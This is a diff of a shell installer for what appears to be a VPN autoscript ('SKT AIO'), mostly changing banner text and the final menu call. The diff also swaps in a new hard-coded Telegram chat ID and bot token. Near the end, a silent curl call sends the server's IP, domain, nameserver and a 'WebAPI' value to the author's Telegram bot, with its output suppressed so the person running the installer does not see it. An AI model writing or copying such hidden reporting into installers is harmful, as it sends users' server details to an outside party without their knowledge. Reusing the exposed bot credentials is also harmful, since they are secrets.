@@ -809,27 +809,28 @@ nsdomain=$(cat /etc/slowdns/nsdomain)
 systemctl restart nginx
 systemctl restart ufw
 OUTPUT="
-=========================
+===========================
 DETAIL INSTALL SCRIPT 1.10
-=========================
+===========================
 IP: $(curl ifconfig.me)
 Domain: $domain
 Namserver: $nsdomain
 WebAPI: $api773
-=========================
-@SkartiVPN
+===========================
+  Credit Byc: @SkartiVPN
+===========================
 "
-CHATID="6389176425"
-KEY="6981433170:AAFhh3UQi2H_lsJiAjGEMoj4xad2TdNHQfI"
+CHATID="5246223530"
+KEY="7140369741:AAGFr7-jE3yWPN6LeRmgIFHtMaJbmRDxetI"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 curl -s --max-time $TIME --data-urlencode "chat_id=$CHATID" --data-urlencode "text=$OUTPUT" $URL >/dev/null 2>&1
 clear
 echo ""
-echo -e "
-  ___ _  _______     _   ___ ___    _____ _   _ _  _ _  _ ___ _    
- / __| |/ /_   _|   /_\ |_ _/ _ \  |_   _| | | | \| | \| | __| |   
- \__ \ ' <  | |    / _ \ | | (_) |   | | | |_| | .` | .` | _|| |__ 
- |___/_|\_\ |_|   /_/ \_\___\___/    |_|  \___/|_|\_|_|\_|___|____| "
- 
+
+echo -e "      𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒆𝒅   " | lolcat
+echo -e "       𝑨𝒖𝒕𝒐𝑺𝒄𝒓𝒊𝒑𝒕 𝑺𝑲𝑻 𝑨𝑰𝑶"
+echo -e "\033[0;34m  𝑻𝒉𝒂𝒏𝒌𝒔 𝒀𝒐𝒖 𝑭𝒐𝒓 𝑼𝒔𝒊𝒏𝒈 𝑴𝒚 𝑺𝒄𝒓𝒊𝒑𝒕 \033[0m"
+
+menu
 sleep 1.5
